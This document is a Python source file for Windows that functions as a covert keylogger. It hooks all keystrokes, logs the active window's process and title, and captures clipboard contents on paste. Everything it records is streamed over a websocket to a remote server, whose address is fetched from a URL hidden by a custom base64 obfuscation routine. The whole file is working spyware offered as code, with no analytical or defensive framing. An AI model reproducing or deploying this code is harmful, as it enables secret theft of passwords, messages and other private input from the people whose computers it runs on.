#!/usr/bin/python
#! -*- coding: utf-8 -*-

from websocket import create_connection
from requests import get
from time import ctime
from ctypes import windll, byref, create_string_buffer, c_ulong
from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
from pyHook import HookManager
from pythoncom import PumpMessages
from binascii import unhexlify
from base64 import b64decode

def deobfuscate(block):
    p = []
    block = b64decode(block)
    for i in xrange(2, len(block)):
        is_mul = False
        for j in p:
            if i % j == 0:
                is_mul = True
                break
        if not is_mul:
            p.append(i)
    return unhexlify(str().join(block[n] for n in p))

def process():
    handle  = windll.user32.GetForegroundWindow()
    pid     = c_ulong(0)

    windll.user32.GetWindowThreadProcessId(handle, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer("\x00" * 512)

    h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)

    windll.psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    window_title = create_string_buffer("\x00" * 512)

    length = windll.user32.GetWindowTextA(handle, byref(window_title),512)
    output = "\n[ PID: %s - %s - %s ]\n" % (process_id, executable.value, window_title.value)
    windll.kernel32.CloseHandle(handle)
    windll.kernel32.CloseHandle(h_process)
    return output

def onEvent(event):
    global ws
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        pid = process()
        ws.send("\n{}\n".format(pid))
        
    if event.Ascii > 32 and event.Ascii < 127:
        ws.send(chr(event.Ascii))
    elif event.Ascii == 32:
        ws.send(' ')
    elif event.Ascii in (10,13):
        ws.send('\n')
    elif event.Ascii == 0:
        pass
    else:
        if event.Key == "V" and os.name == 'nt':
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            ws.send("[PASTE] - %s" % (pasted_value))
        else:
            ws.send(str("%s" % event.Key))
    return True

def main():
    while True:
        kl = HookManager()
        kl.KeyDown = onEvent
        kl.HookKeyboard() 
        PumpMessages()



if __name__ == '__main__':
    current_window  = None
    server          = get(deobfuscate('ZDM2ODU3MTQyY2U3NjQ3NDc3ZDBkMTg3MDIwZWIzOTNiMWI4YWE1NzcyN2YwMDUyZTAzYjdmM2I0Njc2MzEzZTk4YjdkMzIwMDY2OWM5Njk1OWIyYWM3M2RlNTI2MjJkMDc2Mzk2Mzc4NjU1ZDZhOTZjNWQ0MmEyNDk1ODY0Mjc1NGM0Y2JiM2Q3MzIzNjZiNTk4NmEyNmVkYjM4NDZjNWM1ODNkNmQ2MTJlOThmMDhhOTA2Y2Q3YjE4MTEyNmIyNGYyYWE3ZDY2OWRlNDQ3NDY4YTM4ODA2YTlhYmUwMTExYjEyN2YyYjY3N2M5ZDEzNzZkZTMyZThhNmU1ZDVkMTg3MzJiNjIyMzMxYzc3MTZhY2RkZTY0ZTc1NzczNDYyZTRkN2QyNGViOThlNTFjN2Q2NzJhOWRmNTYwMDJjOTljMzk5ZWNiNzMzYjY0YTM4YTkwNTA0MTA0YjQ3ZTM5ZDU3NWEzODk0NDFiMTYwYzU1ZDE3NWZjYTAyMjYyMDk5MjMxNGE3MGI5ODRkODA0ZWQ3MjkwZTdkZTY3MzM5N2RlYzUzMDQxYzI5YTg5ZWMzMGYwNjQ3NTViYzMzMDFkYWM1NmUxMjJlYzU2NjM0NTIyYzc0OGVjYjY0OTUzODg5YTRjNDFlNDRiNjI0NGJlYjdiMTNiOThkZGQ5YTEzMzVhZWMzYzg5NTExNDMxNzExMDJlNzcwMDc0ZDQ4MTEyYzU1MTNkNjhkOTViOWMzMzBlMjczNzI3MDgwYzNjYjYyOTcyZWVjMjMxYTIzYjBjMmExNjU4ODUzZDFhZDllMTMyODRhMTdlYjU='), headers={deobfuscate('MDQ0MTQ1NjAzOWQ0MTk4ZWQyNGQ0ZGE0Y2I5MDliMjYwZDI4YzVlMTE3NzllZTg='):deobfuscate('ZWM0OWQ0MTQ1ZTk1MTVjYjE0YTNkNzczODA4NTE2NTQxMWMyODk1OWIzNzY0ZTk1MWI1NmQxMDI2OTg0NjUzYzk4YTQwMWE3YTRkN2U4ZGQyYzM1NzQ1NGMzZWQ2Mjc2MTU1NzMwMjVkMmU3MzRkNThhYmJhOWFhNTdiZGQ5NTQ4NDVkNGVjMzY0NWVjOGM2Y2RhZDU0YjkwZTJiNjRiOTlkMDQxZWMzNzhjNzY2ZWI2NGM1NTQzZWMyYmIyZDg1NzMzYjUzNTc4YjU5YWJjOTNhMzNiOTQ1ODE4OTViZTRjYTg1MTFjMDE1ZTI1ZDM2OTM4YzgwYzU5MDQ3OGQ5M2E0MDkzODc5ZGFiZWIzYTI1Yzg1NTRiNDhmYzU0M2JlMjRkNjUyNzU1MTUxNjQ0MDc1YTQ2NjYyNTVkYjA2NGI5YmQ4MTYxOGIwNDQ5YTQyYjliMDFhMjEzYzUzMzM4NTg1NDg3MTcxOTYyMjhiYw==')}).json()
    addr            = {'ip':server.get(server.keys()[0])[0].get('ip').encode(), 'port':9020}
    ws = create_connection("ws://{}:{}".format(addr.get('ip'), addr.get('port')))
    main()
